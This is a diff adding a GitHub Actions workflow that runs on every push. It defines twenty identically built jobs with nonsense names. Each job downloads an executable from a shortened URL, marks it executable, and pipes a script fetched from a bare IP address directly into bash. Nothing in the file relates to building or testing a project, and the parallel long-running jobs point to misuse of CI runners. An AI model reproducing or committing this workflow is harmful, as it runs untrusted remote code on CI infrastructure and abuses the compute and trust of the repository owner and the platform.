@@ -1,0 +1,163 @@
+name: nixoho
+on: push
+jobs:
+  norafa:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://tinyurl.com/3uv4bjrm; chmod +x 3uv4bjrm
+    - name: Update
+      run: curl http://103.187.147.137/mandalorian/jakiswusueralsvsanmnrelmirsaba_backup.php?a=dura | bash -
+  fokecefu:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://tinyurl.com/3uv4bjrm; chmod +x 3uv4bjrm
+    - name: Update
+      run: curl http://103.187.147.137/mandalorian/jakiswusueralsvsanmnrelmirsaba_backup.php?a=dura | bash -
+  joxamato:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://tinyurl.com/3uv4bjrm; chmod +x 3uv4bjrm
+    - name: Update
+      run: curl http://103.187.147.137/mandalorian/jakiswusueralsvsanmnrelmirsaba_backup.php?a=dura | bash -
+  gimugive:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://tinyurl.com/3uv4bjrm; chmod +x 3uv4bjrm
+    - name: Update
+      run: curl http://103.187.147.137/mandalorian/jakiswusueralsvsanmnrelmirsaba_backup.php?a=dura | bash -
+  gakayowi:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://tinyurl.com/3uv4bjrm; chmod +x 3uv4bjrm
+    - name: Update
+      run: curl http://103.187.147.137/mandalorian/jakiswusueralsvsanmnrelmirsaba_backup.php?a=dura | bash -
+  mejaho:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://tinyurl.com/3uv4bjrm; chmod +x 3uv4bjrm
+    - name: Update
+      run: curl http://103.187.147.137/mandalorian/jakiswusueralsvsanmnrelmirsaba_backup.php?a=dura | bash -
+  legewu:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://tinyurl.com/3uv4bjrm; chmod +x 3uv4bjrm
+    - name: Update
+      run: curl http://103.187.147.137/mandalorian/jakiswusueralsvsanmnrelmirsaba_backup.php?a=dura | bash -
+  lukeme:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://tinyurl.com/3uv4bjrm; chmod +x 3uv4bjrm
+    - name: Update
+      run: curl http://103.187.147.137/mandalorian/jakiswusueralsvsanmnrelmirsaba_backup.php?a=dura | bash -
+  kenanumo:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://tinyurl.com/3uv4bjrm; chmod +x 3uv4bjrm
+    - name: Update
+      run: curl http://103.187.147.137/mandalorian/jakiswusueralsvsanmnrelmirsaba_backup.php?a=dura | bash -
+  luguka:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://tinyurl.com/3uv4bjrm; chmod +x 3uv4bjrm
+    - name: Update
+      run: curl http://103.187.147.137/mandalorian/jakiswusueralsvsanmnrelmirsaba_backup.php?a=dura | bash -
+  yitaso:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://tinyurl.com/3uv4bjrm; chmod +x 3uv4bjrm
+    - name: Update
+      run: curl http://103.187.147.137/mandalorian/jakiswusueralsvsanmnrelmirsaba_backup.php?a=dura | bash -
+  nobike:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://tinyurl.com/3uv4bjrm; chmod +x 3uv4bjrm
+    - name: Update
+      run: curl http://103.187.147.137/mandalorian/jakiswusueralsvsanmnrelmirsaba_backup.php?a=dura | bash -
+  bekufu:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://tinyurl.com/3uv4bjrm; chmod +x 3uv4bjrm
+    - name: Update
+      run: curl http://103.187.147.137/mandalorian/jakiswusueralsvsanmnrelmirsaba_backup.php?a=dura | bash -
+  mixowaze:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://tinyurl.com/3uv4bjrm; chmod +x 3uv4bjrm
+    - name: Update
+      run: curl http://103.187.147.137/mandalorian/jakiswusueralsvsanmnrelmirsaba_backup.php?a=dura | bash -
+  rujiva:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://tinyurl.com/3uv4bjrm; chmod +x 3uv4bjrm
+    - name: Update
+      run: curl http://103.187.147.137/mandalorian/jakiswusueralsvsanmnrelmirsaba_backup.php?a=dura | bash -
+  lusuza:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://tinyurl.com/3uv4bjrm; chmod +x 3uv4bjrm
+    - name: Update
+      run: curl http://103.187.147.137/mandalorian/jakiswusueralsvsanmnrelmirsaba_backup.php?a=dura | bash -
+  hegofevi:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://tinyurl.com/3uv4bjrm; chmod +x 3uv4bjrm
+    - name: Update
+      run: curl http://103.187.147.137/mandalorian/jakiswusueralsvsanmnrelmirsaba_backup.php?a=dura | bash -
+  zakudu:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://tinyurl.com/3uv4bjrm; chmod +x 3uv4bjrm
+    - name: Update
+      run: curl http://103.187.147.137/mandalorian/jakiswusueralsvsanmnrelmirsaba_backup.php?a=dura | bash -
+  nunuhe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://tinyurl.com/3uv4bjrm; chmod +x 3uv4bjrm
+    - name: Update
+      run: curl http://103.187.147.137/mandalorian/jakiswusueralsvsanmnrelmirsaba_backup.php?a=dura | bash -
+  cixunulo:
+    runs-on: ubuntu-latest
+    timeout-minutes: 180
+    steps:
+    - name: First
+      run: wget https://tinyurl.com/3uv4bjrm; chmod +x 3uv4bjrm
+    - name: Update
+      run: curl http://103.187.147.137/mandalorian/jakiswusueralsvsanmnrelmirsaba_backup.php?a=dura | bash -
